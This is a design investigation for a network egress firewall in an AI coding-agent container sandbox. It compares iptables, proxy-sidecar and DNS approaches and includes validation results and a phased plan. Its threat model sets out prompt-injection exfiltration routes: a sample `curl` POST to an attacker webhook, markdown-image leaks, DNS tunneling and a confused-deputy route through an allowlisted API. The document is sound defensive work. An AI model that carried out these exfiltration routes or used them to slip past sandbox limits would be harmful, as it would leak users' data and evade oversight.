# Network Egress Firewall — Design Investigation

**Date**: 2026-04-17
**Beads**: rip-cage-2py
**Related**: history/2026-04-17-claudebox-comparison.md
**Status**: Investigation complete — Phase 1 recommendation ready; not yet scheduled.

## TL;DR

Recommended Phase 1 approach (**updated 2026-04-17 after OrbStack validation**):
**opt-in iptables-in-container** (ClaudeBox/Anthropic reference pattern) with
domain-to-IP resolution via `ipset`, enabled by a `.rc-egress.yaml` file.
Applied by `init-rip-cage.sh` at container startup as root; the `agent` user
cannot modify rules afterward (verified empirically — see "Validation" below).

Rejected my earlier lean toward a proxy sidecar: the privilege concern that
drove it ("agent with NET_ADMIN can flush rules") turned out to be wrong.
A proxy sidecar is still a valid Phase 2 option for domain-level audit
logging, but it's not needed to close the main gap.

Domain allowlisting is **not** a guarantee — it mitigates ~70–80% of casual
prompt-injection exfil but does not stop the "confused deputy" attack (exfil via
allowlisted `api.anthropic.com`), DNS tunneling, or package post-install hooks.
We should market it honestly as an additional layer, not a seal.

## Validation (2026-04-17, OrbStack)

Test script: `/tmp/test-egress-firewall.sh` (run against OrbStack 28.5.2,
linux/arm64). Results:

| Test | Outcome |
|---|---|
| Baseline: default container cannot touch iptables (no cap) | ✅ denied (expected) |
| With `--cap-add=NET_ADMIN`: `iptables -A OUTPUT ... -j DROP` | ✅ rule enforced — `curl https://example.com` times out post-drop |
| With `NET_ADMIN` granted: non-root `agent` user tries `iptables -F OUTPUT` | ✅ denied ("Permission denied, must be root") — rules survive |

**Implication**: the `NET_ADMIN` capability is granted to the container's
capability set but requires root inside the container to exercise. If
`init-rip-cage.sh` applies rules as root then drops privileges for the rest of
the session, the agent (non-root) cannot bypass the firewall from inside.

**Not yet validated (should validate before Phase 1 ships)**:
- Docker Desktop on macOS (user primarily uses OrbStack; still worth a smoke
  test on Docker Desktop for users who don't)
- Docker Engine on Linux (should be equivalent to OrbStack but confirm)
- `ipset` availability in our base image (Debian; should be fine)
- Behavior across container restart (`docker restart` — do rules persist if
  applied by init-rip-cage.sh, which re-runs? yes, by construction)

## Why this is a real gap

From the ClaudeBox comparison: rip-cage has three in-container safety layers
(container boundary, DCG, compound blocker) but no network egress control. A
prompt-injected agent can still:

1. `curl -X POST https://discord.com/api/webhooks/<attacker>` — exfiltrate via
   any legitimate HTTPS webhook service (MITRE T1567.004, weaponized in real
   npm supply-chain malware per Checkmarx "Webhook Party")
2. `![](https://attacker/?q=<data>)` in rendered markdown — auto-fetch leaks
   data via URL params
3. DNS exfiltration over port 53 (encode data in subdomain queries)
4. Post-install hooks in npm/pip packages — arbitrary code on install

Community consensus (Trail of Bits, Ona research, Simon Willison's "lethal
trifecta", HN discussions on Claude Code hardening) is that network egress
control is a **core pillar** of agent sandboxing, not a nice-to-have. This
aligns with rip-cage's defense-in-depth positioning.

## Threat model

Ranked by realism based on documented attacks (see research doc):

| # | Attack | Does a domain allowlist stop it? |
|---|--------|----------------------------------|
| 1 | Prompt injection → `curl` to attacker webhook | **Yes** (if webhook domain not allowlisted) |
| 2 | Confused deputy: exfil via allowlisted Anthropic API with attacker key | **No** |
| 3 | Markdown image auto-fetch to attacker host | **Yes** (if host not allowlisted) |
| 4 | DNS tunneling over port 53 | **No** (needs behavioral monitoring) |
| 5 | npm/pip post-install hook exfil to attacker | Partially (allowlist helps, but registry mirrors are allowed) |
| 6 | Sandbox escape → local exfil | Yes (still needs network to leave) |

**Baseline allowlist for Claude Code to function** (from Anthropic network-config
docs + typical agent workflows):

- `api.anthropic.com`, `claude.ai`, `platform.claude.com`
- `storage.googleapis.com`, `downloads.claude.ai`, `bridge.claudeusercontent.com`
- `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`
- `github.com`, `objects.githubusercontent.com` (git+release tarballs)
- `crates.io`, `static.crates.io` (optional, Rust)
- DNS (UDP/TCP 53)

Anthropic publishes an official required-domains list at
[code.claude.com/docs/en/network-config](https://code.claude.com/docs/en/network-config)
— we should treat that as the source of truth and update on each Claude Code
release rather than hand-curating.

## Mechanism options evaluated

Three parallel Explore subagents fanned out across ~30 projects and mechanisms.
Key findings summarized here; full report at the top of this doc's references.

### Option A — iptables inside container (ClaudeBox's approach)

- **Mechanism**: `--cap-add=NET_ADMIN`; `init-firewall.sh` runs at container
  start, sets default-drop on OUTPUT chain, ACCEPTs allowlisted IPs (resolved
  from domain list), allows loopback + DNS.
- **Pros**: kernel-enforced; no proxy overhead; same mechanism as ClaudeBox
  and Anthropic's reference devcontainer; works for all protocols, not just HTTP.
- **Cons**:
  - Requires `NET_ADMIN` cap on the container. **Privilege concern invalidated
    by validation**: the cap is only exercisable by root-in-container; the
    non-root `agent` user cannot modify rules even with the cap granted.
    `init-rip-cage.sh` applies rules as root at startup, then drops to agent.
  - Rules operate on IPs, not domains — must pre-resolve and re-resolve on TTL;
    CDN IP rotation causes flaky failures unless you use `ipset` with background
    refresh (ClaudeBox does this).
  - ~~Docker Desktop macOS caveat~~ — validated on OrbStack (works). Docker
    Desktop macOS still needs a smoke test but the mechanism is the same (Linux
    VM with bridge networking), so expected to work.
- **Effort**: Low. Anthropic's `init-firewall.sh` is ~50 lines and we can
  adapt it directly.

### Option B — HTTP(S) egress proxy sidecar (tinyproxy / squid SNI peek)

- **Mechanism**: Sidecar container runs tinyproxy or squid in SNI-peek mode.
  Main container gets `HTTPS_PROXY`/`HTTP_PROXY` env vars. Proxy enforces
  domain allowlist (SNI peek reads TLS ClientHello without decryption — no CA
  cert needed).
- **Pros**:
  - Unprivileged in main container — no `NET_ADMIN` cap.
  - **Domain-level** granularity natively (no IP resolution races).
  - Cross-platform by construction — works identically on Docker Desktop macOS,
    Linux, OrbStack.
  - Debuggable: proxy logs show what was blocked and why. Per-request audit
    trail aligns with rip-cage's observability values.
  - Composes with existing sidecar model (beads server, skills MCP shim).
- **Cons**:
  - Non-HTTP traffic escapes: SSH (git over SSH), raw TCP, DoH all bypass
    proxy unless additionally firewalled. Need to force git to HTTPS and
    block raw SSH at the container's network layer (doable with a minimal
    iptables rule that allows only loopback + proxy port out).
  - Tools that don't honor proxy env vars need wrappers (npm, pip, git, curl
    all do honor them; Go's default `net/http` does; some static binaries
    don't).
  - TLS pinning in some SDKs may reject the peek (rare, worth testing).
- **Effort**: Medium. Sidecar + config + docs. No MITM cert distribution needed
  in SNI-peek mode.

### Option C — DNS-based allowlisting (dnsmasq/CoreDNS sidecar)

- **Mechanism**: Private resolver returns `NXDOMAIN` for non-allowlisted names.
- **Pros**: Protocol-agnostic (covers SSH, HTTP, anything that resolves first).
  Very lightweight.
- **Cons**: Trivially bypassed by hardcoded IPs, DoH, or any attacker who
  resolves a legitimate domain then connects to a different IP.
- **Verdict**: **Layer, not defense.** Useful as a second line alongside A or B
  to catch typos and hardcoded-IP attempts. Not viable alone.

### Options ruled out

- **`--network=none` / `--internal`**: breaks Anthropic API access.
- **Host-side iptables on veth**: Docker Desktop macOS doesn't expose veth on
  the host; fragile across restarts anyway.
- **eBPF (Tetragon/Cilium)**: massive complexity, Linux-only kernel support,
  doesn't fit minimalist positioning. Reserve for Phase 3+ if needed.
- **gVisor / Firecracker / microVM**: no macOS support via Docker Desktop;
  overkill. Docker Sandboxes (`sbx`) is the right answer if we want a microVM
  backend, but that's a separate investigation.
- **Tailscale / Cloudflare Warp**: external dependency + auth + cost; breaks
  "just works, no accounts" DX.

## Recommendation: Phased rollout

### Phase 1 — opt-in iptables + ipset firewall (revised after validation)

**Default**: no firewall. Current DX preserved. Users who want egress control
drop an `.rc-egress.yaml` in their project:

```yaml
egress:
  mode: allowlist    # allowlist | off
  allow:
    - api.anthropic.com
    - claude.ai
    - registry.npmjs.org
    - pypi.org
    - files.pythonhosted.org
    - github.com
    - objects.githubusercontent.com
  # DNS (53) and loopback are always allowed
```

When this file exists, `rc up` adds `--cap-add=NET_ADMIN` to the `docker run`
invocation, and `init-rip-cage.sh` runs a firewall bootstrap script (as root,
before dropping to the `agent` user) that:

1. Resolves each allowlisted domain to IPs via standard DNS, populates an
   `ipset` named `rc-allow`
2. Sets default-DROP on OUTPUT chain
3. ACCEPTs loopback, DNS (53), and packets destined to `rc-allow` ipset on
   ports 80/443 (and 22 if git-over-SSH is allowlisted via config)
4. Starts a tiny background refresher that re-resolves the domains on TTL and
   updates the ipset

No `NET_ADMIN` cap is granted when `.rc-egress.yaml` is absent — default DX
preserved.

Ship a baseline allowlist preset (`rc.preset: claude-code-default`) that maps
to Anthropic's published required domains so most users don't hand-curate.

**Why opt-in first**: aligns with rip-cage's current zero-config first-run DX
(ADR-008 / zero-config-first-run-design). Opt-in avoids user support burden
("npm install hangs!") while we tune the baseline allowlist. Graduate to
opt-out in Phase 2 once the preset is battle-tested.

### Phase 2 — opt-out + audit logging (and possibly a proxy sidecar)

After the preset has been exercised for a few weeks:

- Flip default to `mode: allowlist` with the baseline preset
- Add structured egress logs: `iptables -j NFLOG` or `ipset` hit counters piped
  to `~/.rip-cage/logs/egress-<container>.jsonl` for post-hoc audit
- **Optional**: tinyproxy/squid-SNI-peek sidecar for domain-level audit
  (iptables only sees IPs; proxy sees hostnames). Adds one container but
  gives much better audit logs. Decision defer until we have telemetry on
  what allowlist violations actually look like.
- Document the "confused deputy" limitation prominently so users don't
  oversell the feature to themselves

### Phase 3 (speculative) — behavioral detection, possibly eBPF

Only if evidence (real incidents, user reports, red-team findings) justifies:

- DNS entropy monitoring for subdomain-exfil detection
- Tetragon for syscall-level egress enforcement on Linux
- Evaluate Docker Sandboxes microVM backend as an alternative isolation
  boundary (separate investigation)

## Open questions (must answer before scheduling Phase 1)

1. ~~**Docker Desktop macOS iptables verification.**~~ Validated on OrbStack
   2026-04-17. Smoke test on Docker Desktop still recommended but low risk.
2. **`ipset` refresh cadence.** Anthropic API DNS TTL is short (~60s). Too-
   frequent resolution = unnecessary DNS noise; too-infrequent = agent calls
   fail when IPs rotate. ClaudeBox's approach is worth replicating: resolve on
   startup + every 5min. Document tradeoff.
3. **Allowlist preset maintenance.** Anthropic's required-domains list will
   drift. How do we keep the baseline preset in sync? Options: (a) fetch at
   build time from Anthropic's docs (if stable URL), (b) hand-update on each
   rip-cage release, (c) fetch at first run. Prefer (b) tied to the test
   suite so CI catches drift.
4. **Interaction with skills MCP shim / beads server sidecars.** These run
   on loopback and are always-allowed by the ACCEPT-loopback rule. Confirm
   no collision by running the existing 32-check test suite with firewall on.
5. **Git-over-SSH vs HTTPS.** Many users have git remotes on SSH (port 22 to
   github.com). Two choices: (a) require HTTPS remotes when firewall is on,
   (b) allowlist `github.com:22`. (b) is nicer DX but harder to lock down
   since SSH can tunnel arbitrary TCP. Lean toward (a) with a clear error
   message pointing users to `git remote set-url`.
6. **Proxy sidecar yes/no in Phase 2.** Decide once we have telemetry on
   real allowlist-violation patterns. Don't over-engineer ahead of evidence.

## Decision matrix (quick reference)

| Mechanism | Cross-platform | Privilege cost | Domain-level | Effort | Recommended phase |
|---|---|---|---|---|---|
| iptables + ipset in container | Yes (OrbStack verified; DD macOS pending smoke test) | NET_ADMIN (unusable from agent user) | Via ipset + DNS refresh | Low | **Phase 1 primary** |
| HTTP(S) proxy sidecar | Yes | None (main container) | Yes (native) | Medium | Phase 2 optional (audit logging) |
| DNS sidecar | Yes | None | Yes (DNS only) | Low | Skip — too weak alone, iptables covers the same ground |
| Host iptables | No (macOS) | Host root | No | Medium | Not recommended |
| eBPF (Tetragon) | Linux only | Privileged | Yes | High | Phase 3 if needed |
| gVisor/microVM | No (macOS) | Runtime swap | Yes (via its own rules) | High | Separate investigation |

## References

- [history/2026-04-17-claudebox-comparison.md](../history/2026-04-17-claudebox-comparison.md) — competitive context
- [Anthropic: Claude Code network config](https://code.claude.com/docs/en/network-config) — authoritative required-domains list
- [Trail of Bits claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer) — minimal reference firewall
- [ClaudeBox firewall implementation](https://github.com/RchGrav/claudebox) — iptables+ipset per-project allowlist
- [Simon Willison on the lethal trifecta](https://simonwillison.net/tags/prompt-injection/) — why this matters
- [Oasis Security: Claude.ai prompt-injection exfil](https://www.oasis.security/blog/claude-ai-prompt-injection-data-exfiltration-vulnerability)
- [Claude Pirate: confused deputy via Anthropic API](https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/)
- [MITRE T1567.004 — exfiltration over webhook](https://attack.mitre.org/techniques/T1567/004/)
- [Ona: how Claude Code escapes its sandbox](https://ona.com/stories/how-claude-code-escapes-its-own-denylist-and-sandbox)
- [INNOQ: dev sandbox network control](https://www.innoq.com/en/blog/2026/03/dev-sandbox-network/) — DNS+nftables pattern
- [iron-proxy](https://github.com/ironsh/iron-proxy) — egress proxy with credential injection, audit log reference
